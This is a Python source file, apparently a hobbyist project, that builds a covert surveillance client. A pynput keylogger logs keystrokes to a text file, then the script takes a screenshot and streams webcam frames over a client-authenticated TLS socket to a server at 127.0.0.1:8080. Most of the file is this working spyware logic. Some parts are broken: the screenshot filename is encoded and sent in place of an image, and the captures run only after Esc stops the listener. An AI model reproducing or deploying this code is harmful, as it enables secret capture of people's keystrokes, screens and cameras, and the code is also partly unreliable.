import cv2
import socket
import ssl

from mss import mss
import pynput
from pynput.keyboard import Key,Listener

#https://medium.com/featurepreneur/keylogger-using-python-8c63a3ea6bcf
#reference for building a keylogger

import pynput
from pynput.keyboard import Key, Listener


#Reference from keylogging source
key_list = []
count = 0

def on_press(key):
    global key_list, count
    if key == Key.space:
        key_list.append(" ")
    else:
        key_list.append(key)
        count += 1
        if count > 0:
            count = 0
            write_file(key_list)
            key_list = []

#for program termination
def on_release(key):
    if (key == Key.esc):
        return False

def write_file(key_list):
    with open('keyCaptures.txt','a') as file:
        for i in key_list:
            k = str(i).replace("'","")
            if i == Key.backspace:
                file.write('!')
            elif i == Key.up:
                file.write(" (up) ")
            elif i == Key.down:
                file.write(" (down) ")
            elif i == Key.right:
                file.write(" (right) ")
            elif i == Key.left:
                file.write(" (left) ")
            elif i == Key.enter:
                file.write('\n')
            elif i == Key.ctrl_l or i == Key.shift or i == Key.tab or i == Key.alt_l or i ==Key.esc:
                file.write("")
            else:
                file.write(k)

vc = cv2.VideoCapture(0)
cv2.namedWindow("WebCam", cv2.WINDOW_NORMAL)

#----------------------------------------
# Setup the TLS Socket
#----------------------------------------

client_key = 'client.key'
client_cert = 'client.crt'
server_cert = 'server.crt'
port = 8080

hostname = '127.0.0.1'
context = ssl.SSLContext(ssl.PROTOCOL_TLS, cafile=server_cert)
context.load_cert_chain(certfile=client_cert, keyfile=client_key)
context.load_verify_locations(cafile=server_cert)
context.verify_mode = ssl.CERT_REQUIRED
context.options |= ssl.OP_SINGLE_ECDH_USE
context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2

with socket.create_connection((hostname, port)) as sock:
    with context.wrap_socket(sock, server_side=False,server_hostname=hostname) as ssock:
        #print(ssock.version())
        #message = input("Please enter your message: ")
        #ssock.send(message.encode())
        #receives = ssock.recv(1024)
        #print(receives)
        with Listener(on_press=on_press, on_release=on_release) as l:
            l.join()

            #TAKE SCREENSHOT
            with mss() as sct:
                image = sct.shot()
                ssock.send(image.encode())

            while vc.isOpened():
                status, frame = vc.read()
                #cv2.imshow("WebCam", frame)
                print(frame)
                #-------------------------------
                #Send Frame over an encrypted
                #TCP connection one frame at
                #a time
                ssock.send(frame)
                #-------------------------------
                key = cv2.waitKey(20) #Wait 20 milliseconds before reading the next frame
                if key == 27: #Close if ESC key is pressed.
                    break

        vc.release()
        cv2.destroyWindow("WebCam")